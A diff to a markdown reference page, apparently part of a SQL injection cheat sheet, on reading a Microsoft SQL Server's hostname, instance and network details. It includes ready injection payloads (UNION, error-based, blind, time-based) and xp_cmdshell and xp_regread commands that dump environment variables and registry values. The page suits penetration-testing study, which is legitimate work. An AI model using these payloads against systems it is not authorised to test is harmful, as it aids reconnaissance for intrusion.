@@ -4,7 +4,7 @@ description: How to retrieve the server hostname in Microsoft SQL Server
 category: Information Gathering
 order: 6
 tags: ["hostname", "server information", "reconnaissance"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 Retrieving the server hostname during SQL injection testing can provide valuable information about the target environment. This information can be useful for network mapping, lateral movement, and understanding the server's environment.
@@ -21,18 +21,21 @@ The simplest method is to use the `@@SERVERNAME` global variable:
 SELECT @@SERVERNAME;
 ```
 
-This returns the name of the SQL Server instance as defined during installation.
+This returns the server name stored in `sys.servers` at setup, followed by `\INSTANCE` for a named instance. It does not change automatically when the machine is renamed, so it can be stale.
 
 ### Using SERVERPROPERTY Function
 
 The `SERVERPROPERTY` function provides more detailed server information:
 
 ```sql
--- Get the NetBIOS name of the server
+-- Windows computer name (the virtual server name on a failover cluster)
 SELECT SERVERPROPERTY('MachineName');
 
--- Get the fully qualified domain name (if available)
+-- NetBIOS name of the physical node the instance is running on
 SELECT SERVERPROPERTY('ComputerNamePhysicalNetBIOS');
+
+-- Current machine name plus instance name (SERVER\INSTANCE)
+SELECT SERVERPROPERTY('ServerName');
 ```
 
 ### Using Host and Instance Information
@@ -43,8 +46,10 @@ For more comprehensive information:
 -- Get combined server instance information
 SELECT @@SERVERNAME AS ServerInstance,
        SERVERPROPERTY('MachineName') AS HostName,
-       SERVERPROPERTY('InstanceName') AS InstanceName;
+       SERVERPROPERTY('InstanceName') AS InstanceName;  -- NULL for the default instance
 ```
+
+`HOST_NAME()` is not the server name: it returns the workstation name the client sent when connecting (the web server, in a typical SQL injection).
 
 ## Additional System Information
 
@@ -52,18 +57,22 @@ In SQL Server, you can also retrieve other system information that may include o
 
 ### System Environment Variables
 
+Requires stacked queries, sysadmin (or an `xp_cmdshell` proxy account) and `xp_cmdshell` enabled; Windows commands, not available on SQL Server on Linux:
+
 ```sql
 -- Get all environment variables with xp_cmdshell
-EXEC xp_cmdshell 'set';  -- Requires high privileges
+EXEC xp_cmdshell 'set';
 
 -- Get computer name
-EXEC xp_cmdshell 'echo %COMPUTERNAME%';  -- Requires high privileges
+EXEC xp_cmdshell 'echo %COMPUTERNAME%';
 ```
 
 ### System Information via Registry
 
+`xp_regread` is undocumented and reads the Windows registry. It is often executable by non-sysadmin logins, but newer versions restrict which keys they can read:
+
 ```sql
--- Get registry information about the hostname (requires permissions)
+-- Get the computer name from the registry (stacked query)
 EXEC master.dbo.xp_regread
     @rootkey = 'HKEY_LOCAL_MACHINE',
     @key = 'SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName',
@@ -72,9 +81,11 @@ EXEC master.dbo.xp_regread
 
 ### Network Configuration
 
+The server's IP address and port of the current connection (requires `VIEW SERVER STATE`, or `VIEW SERVER PERFORMANCE STATE` on SQL Server 2022 and later):
+
 ```sql
--- Get network configuration information
-SELECT * FROM sys.dm_exec_connections WHERE session_id = @@SPID;
+SELECT local_net_address, local_tcp_port, client_net_address
+FROM sys.dm_exec_connections WHERE session_id = @@SPID;
 ```
 
 ## Practical Injection Examples
@@ -84,24 +95,28 @@ Here are examples of how to use these techniques in SQL injection scenarios:
 ### Basic UNION Injection
 
 ```sql
-' UNION SELECT @@SERVERNAME, NULL, NULL--
+-- String context, original query returns 3 columns, the second one a string
+' UNION SELECT NULL, @@SERVERNAME, NULL--
 ```
 
 ### Error-based Extraction
 
 ```sql
+-- Fails with: Conversion failed when converting the nvarchar value 'SQLSRV01' to data type int.
 ' AND 1=CONVERT(int, @@SERVERNAME)--
 ```
 
 ### Blind Extraction
 
 ```sql
-' AND SUBSTRING(@@SERVERNAME, 1, 1) = 'S'--
+-- Needs a value that returns a row: the row disappears when the condition is false
+admin' AND SUBSTRING(@@SERVERNAME, 1, 1) = 'S'--
 ```
 
 ### Time-based Verification
 
 ```sql
+-- Stacked statement, see /mssql/timing
 ' IF SUBSTRING(@@SERVERNAME, 1, 1) = 'S' WAITFOR DELAY '0:0:5'--
 ```
 
@@ -114,8 +129,8 @@ Different deployment types can affect what hostname information is available:
 | Standalone Server  | @@SERVERNAME typically matches the Windows hostname         |
 | Named Instance     | @@SERVERNAME includes instance name (e.g., SERVER\INSTANCE) |
 | Clustered Instance | @@SERVERNAME may show the virtual network name              |
-| Docker Container   | May show container ID or custom hostname                    |
-| Azure SQL Database | Limited hostname information (@@SERVERNAME may be obscured) |
+| Docker Container   | Container hostname (the short container ID by default)      |
+| Azure SQL Database | @@SERVERNAME returns the logical server name, not a host    |
 
 ## Security Implications
 
